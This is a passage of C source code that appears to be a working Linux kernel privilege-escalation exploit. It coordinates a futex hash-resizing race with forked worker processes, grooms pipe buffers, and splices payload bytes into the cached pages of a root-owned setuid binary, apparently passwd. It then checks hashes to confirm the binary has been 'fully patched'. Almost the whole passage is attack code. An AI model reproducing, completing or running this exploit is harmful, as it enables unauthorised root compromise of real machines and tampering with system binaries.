		futex_race_futex_call(words->selector, FUTEX_WAKE_PRIVATE, 1);
	selector_errno = selector_result < 0 ? (int)-selector_result : 0;
	selector_return = futex_race_now_ns();
	atomic_store_explicit(&shared->selector_result, selector_result,
			      memory_order_relaxed);
	atomic_store_explicit(&shared->selector_errno, selector_errno,
			      memory_order_relaxed);
	atomic_store_explicit(&shared->selector_return_ns, selector_return,
			      memory_order_relaxed);
	atomic_store_explicit(&shared->selector_done, (int)generation,
			      memory_order_release);
	slots_after = futex_race_get_slots();
	atomic_store_explicit(&shared->slots_after, slots_after,
			      memory_order_release);

	if (atomic_load_explicit(&shared->watchdog_fired, memory_order_acquire))
		abort_attempt(ATTEMPT_UNSAFE, "selector watchdog fired");
	if (selector_result != 0 || selector_errno != 0 ||
	    selector_return < selector_call ||
	    selector_return - selector_call > FUTEX_RACE_SELECTOR_TIMEOUT_NS)
		abort_attempt(ATTEMPT_UNSAFE, "selector ambiguous");
	if (slots_after == FUTEX_RACE_EXPANDED_HASH_SLOTS) {
		if (futex_race_verify_late_queue(shared, &session, words,
						 generation) != 0)
			abort_attempt(ATTEMPT_UNSAFE, "late queue ambiguous");
		if (pipe_bank_publish(shared, generation, session.target_pid) !=
		    0)
			abort_attempt(ATTEMPT_UNSAFE, "publish failed");
		finish_attempt();
	}
	if (slots_after != FUTEX_RACE_INITIAL_HASH_SLOTS)
		abort_attempt(ATTEMPT_UNSAFE, "slots ambiguous");
	atomic_store_explicit(&shared->watchdog_release, (int)generation,
			      memory_order_release);
	if (futex_race_cleanup_miss(shared, &session, words, generation) != 0)
		abort_attempt(ATTEMPT_UNSAFE, "miss cleanup timeout");
	return 0;
}

static int prepare_pi_reservoir(void)
{
	int result = run_pi_reservoir_control();

	if (!aio_reservoir_candidate_valid(result))
		return -1;
	(void)dprintf(STDOUT_FILENO, "[+] reservoir armed\n");
	return 0;
}

static void PAYLOAD_HANDOFF_NORETURN run_futex_race(void)
{
	struct futex_race_shared *shared = futex_race_shared_storage;
	struct futex_race_words words_storage = { 0 };
	struct futex_race_words *words = &words_storage;
	void *word_page;

	if (prctl(PR_GET_NO_NEW_PRIVS, 0, 0, 0, 0) != 1 ||
	    futex_race_security_selfcheck(1) != 0 ||
	    pin_cpu(FUTEX_RACE_CONTROLLER_CPU) != 0 ||
	    futex_race_singleton_cpu(FUTEX_RACE_CONTROLLER_CPU) != 0 ||
	    prctl(PR_SET_NAME, "race-control", 0, 0, 0) != 0 ||
	    block_all_catchable_signals() != 0)
		abort_attempt(ATTEMPT_RETRY, NULL);
	word_page = mmap(NULL, FUTEX_RACE_WORD_PAGE_SIZE,
			 PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS,
			 -1, 0);
	if (shared == NULL || shared == MAP_FAILED || word_page == MAP_FAILED ||
	    sysconf(_SC_PAGESIZE) != (long)FUTEX_RACE_WORD_PAGE_SIZE ||
	    select_same_bucket_words(word_page, words) != 0 ||
	    !atomic_is_lock_free(&shared->generation) ||
	    !atomic_is_lock_free(&shared->timer_deadline_ns) ||
	    !atomic_is_lock_free(words->owner))
		abort_attempt(ATTEMPT_RETRY, NULL);

	memset(shared, 0, sizeof(*shared));
	memset(word_page, 0, FUTEX_RACE_WORD_PAGE_SIZE);
	if (prepare_pi_reservoir() != 0)
		abort_attempt(ATTEMPT_RETRY, NULL);
	if (arm_hash_flushers() != 0)
		abort_attempt(ATTEMPT_RETRY, NULL);
	if (pin_cpu(FUTEX_RACE_CONTROLLER_CPU) != 0 ||
	    futex_race_singleton_cpu(FUTEX_RACE_CONTROLLER_CPU) != 0 ||
	    prctl(PR_SET_NAME, "race-control", 0, 0, 0) != 0)
		abort_attempt(ATTEMPT_RETRY, NULL);
	for (unsigned int generation = 1; generation <= FUTEX_RACE_SWEEP_POINTS;
	     ++generation) {
		uint64_t delta = FUTEX_RACE_SWEEP_FIRST_NS +
				 FUTEX_RACE_SWEEP_STEP_NS *
					 (uint64_t)((generation - 1U) %
						    FUTEX_RACE_SWEEP_BAND);

		int setup_result = run_futex_race_attempt(shared, words,
							  generation, delta);

		if (setup_result == -2)
			abort_attempt(ATTEMPT_UNSAFE,
				      "generation setup after target release");
		if (setup_result != 0) {
			(void)dprintf(
				STDERR_FILENO,
				"[-] generation %u setup failed; armed reservoir lost\n",
				generation);
			abort_attempt(ATTEMPT_RETRY, NULL);
		}
	}
	abort_attempt(ATTEMPT_RETRY, NULL);
}

static uint64_t pipe_bank_now_ns(void)
{
	struct timespec now;

	if (clock_gettime(CLOCK_MONOTONIC, &now) != 0)
		return 0;
	return (uint64_t)now.tv_sec * UINT64_C(1000000000) +
	       (uint64_t)now.tv_nsec;
}

static int pipe_bank_futex_wait(_Atomic int *word, int expected)
{
	return (int)syscall(SYS_futex, word, FUTEX_WAIT, expected, NULL, NULL,
			    0);
}

static int pipe_bank_futex_wake(_Atomic int *word, int count)
{
	return (int)syscall(SYS_futex, word, FUTEX_WAKE, count, NULL, NULL, 0);
}

static void pipe_bank_wait_value(_Atomic int *word, int minimum)
{
	for (;;) {
		int value = atomic_load_explicit(word, memory_order_acquire);

		if (value >= minimum)
			return;
		(void)pipe_bank_futex_wait(word, value);
	}
}

static int pipe_bank_wait_value_timeout(_Atomic int *word, int minimum,
					uint64_t timeout_ns)
{
	uint64_t start = pipe_bank_now_ns();
	struct timespec pause = { .tv_sec = 0, .tv_nsec = 100000 };

	if (!start)
		return -1;
	while (atomic_load_explicit(word, memory_order_acquire) < minimum) {
		uint64_t now = pipe_bank_now_ns();

		if (!now || now - start >= timeout_ns)
			return -1;
		(void)nanosleep(&pause, NULL);
	}
	return 0;
}

static void pipe_bank_note_error(void)
{
	atomic_fetch_add_explicit(&pipe_bank_state->errors, 1,
				  memory_order_relaxed);
}

static int pipe_bank_pin_cpu(unsigned int cpu)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	return sched_setaffinity(0, sizeof(set), &set);
}

static void pipe_bank_park(void) __attribute__((noreturn));

static void pipe_bank_park(void)
{
	for (;;) {
		int value = atomic_load_explicit(&pipe_bank_state->held,
						 memory_order_relaxed);
		(void)pipe_bank_futex_wait(&pipe_bank_state->held, value);
	}
}

static int pipe_bank_prepare_target(void)
{
	const off_t page_offset = payload_handoff_splice_offset & ~(off_t)4095;
	const size_t in_page =
		(size_t)(payload_handoff_splice_offset - page_offset);
	struct stat status;
	volatile uint8_t resident;

	pipe_bank_target_fd = PAYLOAD_HANDOFF_FD_TARGET;
	if (fstat(pipe_bank_target_fd, &status) != 0 ||
	    !S_ISREG(status.st_mode) || status.st_uid != 0 ||
	    status.st_gid != 0 || (status.st_mode & 07777) != 04755 ||
	    status.st_nlink != 1 ||
	    (size_t)status.st_size != payload_handoff_target_bytes ||
	    payload_handoff_verify_target_hash(
		    pipe_bank_target_fd, PAYLOAD_HANDOFF_TARGET_ORIGINAL) != 0)
		return -1;
	pipe_bank_target_map = mmap(NULL, 4096, PROT_READ, MAP_SHARED,
				    pipe_bank_target_fd, page_offset);
	if (pipe_bank_target_map == MAP_FAILED ||
	    mlock(pipe_bank_target_map, 4096) != 0)
		return -1;
	resident = ((volatile uint8_t *)pipe_bank_target_map)[in_page];
	(void)resident;
	return 0;
}

static int pipe_bank_ticket(int fds[PIPE_BANK_PIPES_PER_WORKER][2],
			    unsigned int cpu, unsigned int index,
			    unsigned int wave)
{
	char name[16];
	char byte = 'p';
	char returned = '\0';
	uint64_t origin = atomic_load_explicit(&pipe_bank_state->handoff_ns,
					       memory_order_acquire);
	uint64_t deadline;
	uint64_t begin;
	uint64_t end;
	long before;
	long set_result;
	long after;

	(void)snprintf(name, sizeof(name), "pipe-grow%u-%03u", cpu, index);
	if (prctl(PR_SET_NAME, name, 0, 0, 0) != 0 || !origin)
		return -1;
	deadline = origin +
		   (uint64_t)pipe_wave_delays_ms[wave] * UINT64_C(1000000);
	before = fcntl(fds[index][1], F_GETPIPE_SZ);
	begin = pipe_bank_now_ns();
	set_result = fcntl(fds[index][1], F_SETPIPE_SZ,
			   PIPE_BANK_CAPTURE_PIPE_BYTES);
	after = fcntl(fds[index][1], F_GETPIPE_SZ);
	if (before != PIPE_BANK_PREP_PIPE_BYTES ||
	    set_result != PIPE_BANK_CAPTURE_PIPE_BYTES ||
	    after != PIPE_BANK_CAPTURE_PIPE_BYTES || !begin ||
	    begin < deadline || begin - deadline > PIPE_BANK_MAX_LATE_NS ||
	    write(fds[index][1], &byte, 1) != 1 ||
	    read(fds[index][0], &returned, 1) != 1 || returned != byte ||
	    payload_handoff_splice_target_byte(fds[index][1]) != 0)
		return -1;
	end = pipe_bank_now_ns();
	if (!end || end < begin || end - begin > PIPE_BANK_MAX_LATE_NS)
		return -1;
	return 0;
}

static void pipe_bank_worker(unsigned int cpu) __attribute__((noreturn));

static void pipe_bank_worker(unsigned int cpu)
{
	int fds[PIPE_BANK_PIPES_PER_WORKER][2];
	char name[16];

	payload_handoff_worker_keep_target_only();
	if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != 0 ||
	    prctl(PR_GET_NO_NEW_PRIVS, 0, 0, 0, 0) != 1 ||
	    pipe_bank_pin_cpu(cpu) != 0)
		pipe_bank_note_error();
	for (unsigned int index = 0; index < PIPE_BANK_PIPES_PER_WORKER;
	     ++index) {
		char byte = 'c';
		char returned = '\0';
		long initial;

		fds[index][0] = fds[index][1] = -1;
		if (pipe2(fds[index], O_CLOEXEC) != 0) {
			pipe_bank_note_error();
			continue;
		}
		initial = fcntl(fds[index][1], F_GETPIPE_SZ);
		if (initial != PIPE_BANK_DEFAULT_PIPE_BYTES ||
		    fcntl(fds[index][1], F_SETPIPE_SZ,
			  PIPE_BANK_PREP_PIPE_BYTES) !=
			    PIPE_BANK_PREP_PIPE_BYTES ||
		    fcntl(fds[index][1], F_GETPIPE_SZ) !=
			    PIPE_BANK_PREP_PIPE_BYTES ||
		    write(fds[index][1], &byte, 1) != 1 ||
		    read(fds[index][0], &returned, 1) != 1 || returned != byte)
			pipe_bank_note_error();
	}
	(void)snprintf(name, sizeof(name), "pipe-worker%u", cpu);
	if (prctl(PR_SET_NAME, name, 0, 0, 0) != 0)
		pipe_bank_note_error();
	atomic_fetch_add_explicit(&pipe_bank_state->ready, 1,
				  memory_order_release);
	(void)pipe_bank_futex_wake(&pipe_bank_state->ready, INT_MAX);
	for (unsigned int wave = 0; wave < PIPE_BANK_WAVES; ++wave) {
		int generation;

		pipe_bank_wait_value(&pipe_bank_state->wave, (int)wave + 1);
		generation = atomic_load_explicit(&pipe_bank_state->generation,
						  memory_order_acquire);
		for (unsigned int lane = 0; lane < PIPE_BANK_PIPES_PER_WAVE;
		     ++lane) {
			unsigned int index =
				wave * PIPE_BANK_PIPES_PER_WAVE + lane;

			if (generation <= 0 ||
			    pipe_bank_ticket(fds, cpu, index, wave) != 0)
				pipe_bank_note_error();
			atomic_fetch_add_explicit(&pipe_bank_state->tickets, 1,
						  memory_order_release);
		}
		(void)pipe_bank_futex_wake(&pipe_bank_state->tickets, INT_MAX);
	}
	pipe_bank_wait_value(&pipe_bank_state->census_go, 1);
	for (unsigned int index = 0; index < PIPE_BANK_PIPES_PER_WORKER;
	     ++index)
		if (fds[index][0] < 0 || fds[index][1] < 0 ||
		    fcntl(fds[index][1], F_GETPIPE_SZ) !=
			    PIPE_BANK_CAPTURE_PIPE_BYTES)
			pipe_bank_note_error();
	atomic_fetch_add_explicit(&pipe_bank_state->census_done, 1,
				  memory_order_release);
	(void)pipe_bank_futex_wake(&pipe_bank_state->census_done, INT_MAX);
	pipe_bank_wait_value(&pipe_bank_state->stage, 1);
	for (unsigned int index = 0; index < PIPE_BANK_PIPES_PER_WORKER;
	     ++index) {
		(void)snprintf(name, sizeof(name), "pipe-fill%u-%03u", cpu,
			       index);
		if (prctl(PR_SET_NAME, name, 0, 0, 0) != 0 ||
		    payload_handoff_write_pipe_stage(fds[index][1],
						     PIPE_PAYLOAD_PARTIAL) != 0)
			pipe_bank_note_error();
	}
	atomic_fetch_add_explicit(&pipe_bank_state->stage1_done, 1,
				  memory_order_release);
	(void)pipe_bank_futex_wake(&pipe_bank_state->stage1_done, INT_MAX);
	pipe_bank_wait_value(&pipe_bank_state->stage, 2);
	for (unsigned int index = 0; index < PIPE_BANK_PIPES_PER_WORKER;
	     ++index) {
		(void)snprintf(name, sizeof(name), "pipe-fill%u-%03u", cpu,
			       index);
		if (prctl(PR_SET_NAME, name, 0, 0, 0) != 0 ||
		    payload_handoff_write_pipe_stage(
			    fds[index][1], PIPE_PAYLOAD_COMPLETE) != 0)
			pipe_bank_note_error();
	}

	atomic_fetch_add_explicit(&pipe_bank_state->worker_park_intent, 1,
				  memory_order_release);
	atomic_fetch_add_explicit(&pipe_bank_state->stage2_done, 1,
				  memory_order_release);
	(void)pipe_bank_futex_wake(&pipe_bank_state->stage2_done, INT_MAX);
	pipe_bank_park();
}

static void hash_flusher_main(unsigned int index) __attribute__((noreturn));

static void hash_flusher_main(unsigned int index)
{
	char name[16];
	long initial_slots;
	long set_initial_slots_rc;
	long configured_initial_slots;
	long set_expanded_slots_rc;
	long configured_expanded_slots;

	payload_handoff_vulnerable_close_effect_fds();
	(void)snprintf(name, sizeof(name), "hash-flush%02u", index);
	if (prctl(PR_SET_NAME, name, 0, 0, 0) != 0 ||
	    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != 0 ||
	    prctl(PR_GET_NO_NEW_PRIVS, 0, 0, 0, 0) != 1 ||
	    pipe_bank_pin_cpu(HASH_FLUSHER_CPU) != 0 ||
	    futex_race_singleton_cpu(HASH_FLUSHER_CPU) != 0 ||
	    futex_race_security_selfcheck(1) != 0 ||
	    block_all_catchable_signals() != 0)
		pipe_bank_note_error();
	atomic_fetch_add_explicit(&pipe_bank_state->ready, 1,
				  memory_order_release);
	(void)pipe_bank_futex_wake(&pipe_bank_state->ready, INT_MAX);
	pipe_bank_wait_value(&pipe_bank_state->hash_flush_arm, 1);
	initial_slots = prctl(PR_FUTEX_HASH, PR_FUTEX_HASH_GET_SLOTS, 0, 0, 0);
	set_initial_slots_rc = prctl(PR_FUTEX_HASH, PR_FUTEX_HASH_SET_SLOTS,
				     HASH_FLUSH_INITIAL_SLOTS, 0, 0);
	configured_initial_slots =
		prctl(PR_FUTEX_HASH, PR_FUTEX_HASH_GET_SLOTS, 0, 0, 0);
	if (initial_slots != 0 || set_initial_slots_rc != 0 ||
	    configured_initial_slots != (long)HASH_FLUSH_INITIAL_SLOTS)
		pipe_bank_note_error();
	atomic_fetch_add_explicit(&pipe_bank_state->hash_flush_armed, 1,
				  memory_order_release);
	(void)pipe_bank_futex_wake(&pipe_bank_state->hash_flush_armed, INT_MAX);
	pipe_bank_wait_value(&pipe_bank_state->hash_flush_go, 1);
	set_expanded_slots_rc = prctl(PR_FUTEX_HASH, PR_FUTEX_HASH_SET_SLOTS,
				      HASH_FLUSH_EXPANDED_SLOTS, 0, 0);
	configured_expanded_slots =
		prctl(PR_FUTEX_HASH, PR_FUTEX_HASH_GET_SLOTS, 0, 0, 0);
	if (set_expanded_slots_rc != 0 ||
	    configured_expanded_slots != (long)HASH_FLUSH_EXPANDED_SLOTS)
		pipe_bank_note_error();
	atomic_fetch_add_explicit(&pipe_bank_state->hash_flusher_park_intent, 1,
				  memory_order_release);
	atomic_fetch_add_explicit(&pipe_bank_state->hash_flush_done, 1,
				  memory_order_release);
	(void)pipe_bank_futex_wake(&pipe_bank_state->hash_flush_done, INT_MAX);
	pipe_bank_park();
}

static int pipe_bank_pidfd_barrier(int pidfd, short *events)
{
	struct pollfd descriptor = { .fd = pidfd, .events = POLLIN };
	int result;

	do {
		result = poll(&descriptor, 1, 5000);
	} while (result < 0 && errno == EINTR);
	*events = descriptor.revents;
	return result == 1 && (descriptor.revents & POLLIN) != 0 &&
			       (descriptor.revents &
				(POLLHUP | POLLERR | POLLNVAL)) == 0 ?
		       0 :
		       -1;
}

static int pipe_bank_pre_signal_checks(unsigned int generation, pid_t target,
				       int pidfd)
{
	struct pollfd descriptor = { .fd = pidfd, .events = POLLIN };
	struct futex_race_shared *race_state = futex_race_shared_storage;
	int nnp = prctl(PR_GET_NO_NEW_PRIVS, 0, 0, 0, 0);

	if (!race_state || race_state != futex_race_shared_storage ||
	    !effect_shared || target <= 1 || kill(target, 0) != 0 ||
	    poll(&descriptor, 1, 0) != 0 || descriptor.revents != 0 ||
	    nnp != 1 ||
	    atomic_load_explicit(&effect_shared->effect_ready,
				 memory_order_acquire) != 1 ||
	    atomic_load_explicit(&effect_shared->effect_error,
				 memory_order_acquire) != 0 ||
	    atomic_load_explicit(&effect_shared->parent_no_new_privs_enabled,
				 memory_order_acquire) != 1 ||
	    atomic_load_explicit(&pipe_bank_state->target_publish_count,
				 memory_order_acquire) != 1 ||
	    atomic_load_explicit(&race_state->generation,
				 memory_order_acquire) != generation ||
	    atomic_load_explicit(&race_state->selector_done,
				 memory_order_acquire) != (int)generation ||
	    atomic_load_explicit(&race_state->slots_after,
				 memory_order_acquire) !=
		    (long)FUTEX_RACE_EXPANDED_HASH_SLOTS ||
	    atomic_load_explicit(&race_state->target_done,
				 memory_order_acquire) != 0 ||
	    payload_handoff_verify_target_hash(
		    PAYLOAD_HANDOFF_FD_TARGET,
		    PAYLOAD_HANDOFF_TARGET_ORIGINAL) != 0)
		return -1;
	return 0;
}

static void pipe_bank_controller(void) __attribute__((noreturn));

static void pipe_bank_controller(void)
{
	uint64_t handoff;
	int generation;
	pid_t target = -1;
	int pidfd = -1;
	short revents = 0;
	const char *fail_phase = "controller-start";

	if (payload_handoff_controller_keep_verifiers() != 0 ||
	    prctl(PR_SET_NAME, "attempt-control", 0, 0, 0) != 0 ||
	    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != 0 ||
	    prctl(PR_GET_NO_NEW_PRIVS, 0, 0, 0, 0) != 1)
		pipe_bank_note_error();
	atomic_fetch_add_explicit(&pipe_bank_state->ready, 1,
				  memory_order_release);
	(void)pipe_bank_futex_wake(&pipe_bank_state->ready, INT_MAX);
	pipe_bank_wait_value(&pipe_bank_state->go, 2);
	handoff = atomic_load_explicit(&pipe_bank_state->handoff_ns,
				       memory_order_acquire);
	generation = atomic_load_explicit(&pipe_bank_state->generation,
					  memory_order_acquire);
	if (!handoff || generation <= 0)
		goto fail;
	for (unsigned int wave = 0; wave < PIPE_BANK_WAVES; ++wave) {
		uint64_t deadline =
			handoff +
			(uint64_t)pipe_wave_delays_ms[wave] * UINT64_C(1000000);
		struct timespec absolute = {
			.tv_sec = (time_t)(deadline / UINT64_C(1000000000)),
			.tv_nsec = (long)(deadline % UINT64_C(1000000000)),
		};
		int result;

		do {
			result = clock_nanosleep(CLOCK_MONOTONIC, TIMER_ABSTIME,
						 &absolute, NULL);
		} while (result == EINTR);
		if (result != 0)
			pipe_bank_note_error();
		atomic_store_explicit(&pipe_bank_state->wave, (int)wave + 1,
				      memory_order_release);
		(void)pipe_bank_futex_wake(&pipe_bank_state->wave,
					   PIPE_BANK_WORKERS);
		if (pipe_bank_wait_value_timeout(
			    &pipe_bank_state->tickets,
			    ((int)wave + 1) * PIPE_BANK_WORKERS *
				    PIPE_BANK_PIPES_PER_WAVE,
			    PIPE_BANK_TIMEOUT_NS) != 0)
			pipe_bank_note_error();
	}
	atomic_store_explicit(&pipe_bank_state->census_go, 1,
			      memory_order_release);
	(void)pipe_bank_futex_wake(&pipe_bank_state->census_go,
				   PIPE_BANK_WORKERS);
	if (pipe_bank_wait_value_timeout(&pipe_bank_state->census_done,
					 PIPE_BANK_WORKERS,
					 PIPE_BANK_TIMEOUT_NS) != 0 ||
	    atomic_load_explicit(&pipe_bank_state->tickets,
				 memory_order_acquire) !=
		    PIPE_BANK_TOTAL_PIPES ||
	    atomic_load_explicit(&pipe_bank_state->errors,
				 memory_order_acquire) != 0) {
		fail_phase = "post-census";
		goto fail;
	}
	atomic_store_explicit(&pipe_bank_state->retained, 1,
			      memory_order_release);
	if (atomic_load_explicit(&pipe_bank_state->target_publish_count,
				 memory_order_acquire) != 1 ||
	    atomic_load_explicit(&pipe_bank_state->target_generation,
				 memory_order_relaxed) !=
		    (unsigned int)generation) {
		fail_phase = "target-publication";
		goto fail;
	}
	target = (pid_t)atomic_load_explicit(
		&pipe_bank_state->latest_target_pid, memory_order_relaxed);
	pidfd = (int)syscall(SYS_pidfd_open, target, 0U);
	if (pidfd < 0 || pipe_bank_pre_signal_checks((unsigned int)generation,
						     target, pidfd) != 0) {
		fail_phase = "pre-signal";
		goto fail;
	}
	if (syscall(SYS_pidfd_send_signal, pidfd, SIGKILL, NULL, 0U) != 0) {
		fail_phase = "pidfd-send-sigkill";
		goto fail;
	}
	if (pipe_bank_pidfd_barrier(pidfd, &revents) != 0) {
		fail_phase = "pidfd-poll-barrier";
		goto fail;
	}
	atomic_store_explicit(&pipe_bank_state->stage, 1, memory_order_release);
	(void)pipe_bank_futex_wake(&pipe_bank_state->stage, PIPE_BANK_WORKERS);
	if (pipe_bank_wait_value_timeout(&pipe_bank_state->stage1_done,
					 PIPE_BANK_WORKERS,
					 PIPE_BANK_TIMEOUT_NS) != 0 ||
	    payload_handoff_verify_target_hash(PAYLOAD_HANDOFF_FD_TARGET,
					       TARGET_PARTIALLY_PATCHED) != 0) {
		fail_phase = "partial-payload";
		goto fail;
	}
	atomic_store_explicit(&pipe_bank_state->stage, 2, memory_order_release);
	(void)pipe_bank_futex_wake(&pipe_bank_state->stage, PIPE_BANK_WORKERS);
	if (pipe_bank_wait_value_timeout(&pipe_bank_state->stage2_done,
					 PIPE_BANK_WORKERS,
					 PIPE_BANK_TIMEOUT_NS) != 0 ||
	    atomic_load_explicit(&pipe_bank_state->worker_park_intent,
				 memory_order_acquire) != PIPE_BANK_WORKERS ||
	    atomic_load_explicit(&pipe_bank_state->errors,
				 memory_order_acquire) != 0 ||
	    payload_handoff_verify_target_hash(PAYLOAD_HANDOFF_FD_TARGET,
					       TARGET_FULLY_PATCHED) != 0) {
		fail_phase = "complete-payload";
		goto fail;
	}
	if (payload_handoff_effect_release(effect_shared) != 0) {
		fail_phase = "effect-release";
		goto fail;
	}
	atomic_store_explicit(&pipe_bank_state->controller_park_intent, 1,
			      memory_order_release);
	atomic_store_explicit(&pipe_bank_state->held, 1, memory_order_release);
	pipe_bank_park();

fail:
	(void)dprintf(STDERR_FILENO, "[-] controller stopped at %s\n",
		      fail_phase);

	if (payload_handoff_verify_target_hash(
		    PAYLOAD_HANDOFF_FD_TARGET,
		    PAYLOAD_HANDOFF_TARGET_ORIGINAL) != 0)
		(void)dprintf(
			STDERR_FILENO,
			"[!] %s/%s is still patched and cannot be repaired from here;\n"
			"[!] run: sudo apt-get install --reinstall passwd\n",
			payload_handoff_target_dir,
			payload_handoff_target_path);
	pipe_bank_park();
}

static int start_pipe_bank(void)
{
	pid_t children[PIPE_BANK_READY_TOTAL] = { 0 };
	unsigned int created = 0;

	pipe_bank_state = mmap(NULL, sizeof(*pipe_bank_state),
			       PROT_READ | PROT_WRITE,
			       MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	futex_race_shared_storage = mmap(NULL, sizeof(struct futex_race_shared),
					 PROT_READ | PROT_WRITE,
					 MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (pipe_bank_state == MAP_FAILED ||
	    futex_race_shared_storage == MAP_FAILED)
		return -1;
	memset(pipe_bank_state, 0, sizeof(*pipe_bank_state));
	memset(futex_race_shared_storage, 0, sizeof(struct futex_race_shared));
	for (unsigned int index = 0; index < HASH_FLUSHER_COUNT; ++index) {
		pid_t child = fork();

		if (child == 0)
			hash_flusher_main(index);
		if (child < 0)
			goto fail;
		children[created++] = child;
	}
	for (unsigned int cpu = 0; cpu < PIPE_BANK_WORKERS; ++cpu) {
		pid_t child = fork();

		if (child == 0)
			pipe_bank_worker(cpu);
		if (child < 0)
			goto fail;
		children[created++] = child;
	}
	{
		pid_t child = fork();

		if (child == 0)
			pipe_bank_controller();
		if (child < 0)
			goto fail;
		children[created++] = child;
	}
	if (pipe_bank_wait_value_timeout(&pipe_bank_state->ready,
					 PIPE_BANK_READY_TOTAL,
					 PIPE_BANK_TIMEOUT_NS) != 0 ||
	    atomic_load_explicit(&pipe_bank_state->errors,
				 memory_order_acquire) != 0)
		goto fail;
	return 0;

fail:
	for (unsigned int index = 0; index < created; ++index)
		(void)kill(children[index], SIGKILL);
	for (unsigned int index = 0; index < created; ++index)
		(void)waitpid(children[index], NULL, 0);
	return -1;
}

static int arm_hash_flushers(void)
{
	if (!pipe_bank_state || pipe_bank_state == MAP_FAILED ||
	    atomic_load_explicit(&pipe_bank_state->hash_flush_armed,
				 memory_order_acquire) != 0 ||
	    atomic_load_explicit(&pipe_bank_state->errors,
				 memory_order_acquire) != 0)
		return -1;
	atomic_store_explicit(&pipe_bank_state->hash_flush_arm, 1,
			      memory_order_release);
	(void)pipe_bank_futex_wake(&pipe_bank_state->hash_flush_arm,
				   HASH_FLUSHER_COUNT);
	if (pipe_bank_wait_value_timeout(&pipe_bank_state->hash_flush_armed,
					 HASH_FLUSHER_COUNT,
					 PIPE_BANK_TIMEOUT_NS) != 0 ||
	    atomic_load_explicit(&pipe_bank_state->errors,
				 memory_order_acquire) != 0)
		return -1;
	return 0;
}

static int pipe_bank_publish(struct futex_race_shared *race_state,
			     unsigned int generation, pid_t target)
{
	uint64_t origin;
	uint64_t handoff;
	int expected = 0;

	if (!race_state || race_state != futex_race_shared_storage ||
	    !pipe_bank_state || generation == 0 || target <= 1 ||
	    kill(target, 0) != 0)
		return -1;
	origin = atomic_load_explicit(&race_state->selector_return_ns,
				      memory_order_acquire);
	if (!origin ||
	    atomic_load_explicit(&race_state->generation,
				 memory_order_acquire) != generation ||
	    atomic_load_explicit(&race_state->selector_done,
				 memory_order_acquire) != (int)generation ||
	    atomic_load_explicit(&race_state->slots_after,
				 memory_order_acquire) !=
		    (long)FUTEX_RACE_EXPANDED_HASH_SLOTS ||
	    atomic_load_explicit(&race_state->target_done,
				 memory_order_acquire) != 0 ||
	    atomic_load_explicit(&pipe_bank_state->hash_flush_armed,
				 memory_order_acquire) != HASH_FLUSHER_COUNT)
		return -1;
	atomic_store_explicit(&pipe_bank_state->hash_flush_go, 1,
			      memory_order_release);
	(void)pipe_bank_futex_wake(&pipe_bank_state->hash_flush_go,
				   HASH_FLUSHER_COUNT);
	if (pipe_bank_wait_value_timeout(&pipe_bank_state->hash_flush_done,
					 HASH_FLUSHER_COUNT,
					 PIPE_BANK_TIMEOUT_NS) != 0 ||
	    atomic_load_explicit(&pipe_bank_state->hash_flusher_park_intent,
				 memory_order_acquire) != HASH_FLUSHER_COUNT ||
	    atomic_load_explicit(&pipe_bank_state->errors,
				 memory_order_acquire) != 0)
		return -1;
	if (kill(target, 0) != 0 ||
	    atomic_load_explicit(&race_state->generation,
				 memory_order_acquire) != generation ||
	    atomic_load_explicit(&race_state->selector_done,
				 memory_order_acquire) != (int)generation ||
	    atomic_load_explicit(&race_state->slots_after,
				 memory_order_acquire) !=
		    (long)FUTEX_RACE_EXPANDED_HASH_SLOTS ||
	    atomic_load_explicit(&race_state->target_done,
				 memory_order_acquire) != 0)
		return -1;
	handoff = pipe_bank_now_ns();
	if (!handoff || handoff < origin ||
	    handoff - origin > PIPE_BANK_MAX_HANDOFF_NS ||
	    !atomic_compare_exchange_strong_explicit(
		    &pipe_bank_state->target_publish_count, &expected, 1,
		    memory_order_acq_rel, memory_order_acquire))
		return -1;
	atomic_store_explicit(&pipe_bank_state->latest_target_pid, target,
			      memory_order_relaxed);
	atomic_store_explicit(&pipe_bank_state->target_generation, generation,
			      memory_order_relaxed);
	atomic_store_explicit(&pipe_bank_state->selector_return_ns, origin,
			      memory_order_relaxed);
	atomic_store_explicit(&pipe_bank_state->handoff_ns, handoff,
			      memory_order_relaxed);
	atomic_store_explicit(&pipe_bank_state->generation, (int)generation,
			      memory_order_relaxed);
	(void)dprintf(STDOUT_FILENO, "[+] landing hit (generation %u)\n",
		      generation);
	atomic_store_explicit(&pipe_bank_state->go, 2, memory_order_release);
	(void)pipe_bank_futex_wake(&pipe_bank_state->go, 1);
	return 0;
}

static int commit_parent_no_new_privs(void)
{
	if (parent_no_new_privs_commits != 0 || effect_shared == NULL ||
	    commit_aio_parent_no_new_privs() != 0 ||
	    payload_handoff_publish_parent_no_new_privs(effect_shared) != 0)
		return -1;
	parent_no_new_privs_commits = 1;
	return 0;
}

static int is_parent_of(const char *name, pid_t *parent)
{
	char path[64];
	char buffer[2048];
	const char *field;
	ssize_t got;
	int fd;

	if (snprintf(path, sizeof(path), "/proc/%s/status", name) <= 0)
		return -1;
	fd = open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return -1;
	do {
		got = read(fd, buffer, sizeof(buffer) - 1);
	} while (got < 0 && errno == EINTR);
	(void)close(fd);
	if (got <= 0)
		return -1;
	buffer[got] = '\0';
	field = strstr(buffer, "\nPPid:");
	if (field == NULL)
		return -1;
	*parent = (pid_t)strtol(field + 6, NULL, 10);
	return 0;
}

static void kill_attempt_descendants(void)
{
	pid_t self = getpid();

	for (unsigned int pass = 0; pass < 8; ++pass) {
		struct dirent *entry;
		DIR *proc = opendir("/proc");
		int killed = 0;

		if (proc == NULL)
			return;
		while ((entry = readdir(proc)) != NULL) {
			pid_t parent;
			pid_t victim;

			if (entry->d_name[0] < '1' || entry->d_name[0] > '9')
				continue;
			victim = (pid_t)strtol(entry->d_name, NULL, 10);
			if (victim <= 1 || victim == self ||
			    is_parent_of(entry->d_name, &parent) != 0 ||
			    parent != self)
				continue;
			if (kill(victim, SIGKILL) == 0)
				killed = 1;
		}
		(void)closedir(proc);
